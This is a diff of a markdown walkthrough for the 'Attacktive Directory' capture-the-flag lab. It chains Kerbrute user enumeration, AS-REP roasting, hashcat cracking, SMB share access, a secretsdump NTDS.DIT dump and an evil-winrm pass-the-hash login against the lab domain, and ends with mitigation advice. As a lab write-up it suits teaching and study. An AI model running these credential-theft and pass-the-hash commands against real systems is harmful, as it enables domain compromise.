@@ -33,6 +33,7 @@ After these have been installed make sure to update your Kali VM
 apt update
 ```
 
+
 ## Enumeration - Welcome to Attacktive Directory
 
 Questions 
@@ -43,19 +44,18 @@ Questions
 
 The first question is pretty easy. A simple google search of 'enumeration with kali linux' will give us the name of the tool installed in kali linux that can enumerate. 
 
-
+![AT1](/Images/AT1.png)
 
 For the second and third question we need to perform a nmap scan with the '-A' option. 
 
-
-
-
+![AT2](/Images/AT2.png)
 
 Pretty easy so far. 
 
+
 ## Enumeration - Enumerating Users via Kerberos
 
-
+![AT5](/Images/AT5.png)
 
 Questions 
 
@@ -67,18 +67,19 @@ According to the intro, the host is running Kerberos. We can also see from our n
 
 The room recommends downloading the tool Kerbrute and downloading a user list and password list. 
 
-
-
 Once eveything is download we are going to run the following command. 
 
 ```
 ./kerbrute_linux_amd64 userenum --dc TARGET IP -d spookysec.local userlist.txt
 ```
+![AT7](/Images/AT7.png)
 
 Here we can see a few interesting accounts that answer questions two and three. 
 
+
 ## Exploitation - Abusing Kerberos
 
+![AT8](/Images/AT8.png)
 
 Questions 
 
@@ -98,6 +99,8 @@ python3 impacket/examples/GetNPUsers.py -dc-ip TARGET IP -usersfile USERS FILE s
 
 This command will provide us the answer to question one. 
 
+![AT9](/Images/AT9.png)
+
 From we can navigate to the following webpage to find the answers to questions two and three. 
 https://hashcat.net/wiki/doku.php?id=example_hashes
 
@@ -111,8 +114,12 @@ hashcat -m 18200 HASH FILE passwordlist.txt
 
 The password to the user account and the answer to question four is at the end of the hash.
 
+![AT10](/Images/AT10.png)
+
 
 ## Enumeration - Back to the Basics
+
+![AT12](/Images/AT12.png)
 
 With the user's credentials, we can use them to enumerate shares.
 
@@ -132,7 +139,7 @@ Run the following command to list the shares and get the answers to questions th
 smbclient -L TARGET IP -U spookysec.local/svc-admin%management2005
 ```
 
-
+![AT24](/Images/AT24.png)
 
 Now that we have the list of shares. Let's try and connect to each of them and see if we find anything interesting.
 
@@ -143,16 +150,24 @@ smbclient //TARGET IP/ADMIN$ -U svc-admin
 ```
 For the first share we get an access denied. Let's try the second one. 
 
+![AT15](/Images/AT15.png)
 
 We can access the second share with an interesting txt file. Use 'more' to view the content of the file. With this information we can answer questions four and five.
 
+![AT14](/Images/AT14.png)
+
+![AT13](/Images/AT13.png)
+
 Copy the string, throw it in CyberChef, and use the Magic function to decode it.
+
+![AT16](/Images/AT16.png)
 
 
 ## Domain Privilege Escalation - Elvating Privileges within the Domain
 
+![AT18](/Images/AT18.png)
 
-
+![AT19](/Images/AT19.png)
 
 Questions
 1. What method allowed us to dump NTDS.DIT?
@@ -168,6 +183,7 @@ Run the following command to get the hashes and the answers to questions one and
 ```
 python3 impacket/examples/secretsdump.py -just-dc spookysec.local/backup:backup251786@TARGET IP
 ```
+![AT20](/Images/AT20.png)
 
 The answer to question 3 is pretty easy, if you don't know copy and paste it into Google.
 
@@ -181,16 +197,21 @@ Run the following command to execute the pass the hash attack and connect to the
 ```
 evil-winrm -i TARGET IP -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
 ```
-From here navigate through the directory to find and submit the flags.
+
+![AT22](/Images/AT22.png)
+
+From here navigate through the directory to find and submit the flags to complete the CTF.
+
+![AT23](/Images/AT23.png)
 
 
+## Final Thoughts and Conclusion
 
+Overall this was a fun and easy CTF. A few things I want to highlight. 
 
+I'm not sure why the room asked to download bloodhound and neo4j. Bloodhound is used to identify different attack paths in Active Directory and is built on neo4j, but we didn't use it in this CTF. At least not to my knowledge, will need to do some more digging. 
 
-
-
-
-
+Most of these attacks can be mitigated by using reviewing group policies, enforcing strong authentication, enforing complex password, and disabling legacy services and protocols.
 
 
 [back](./)
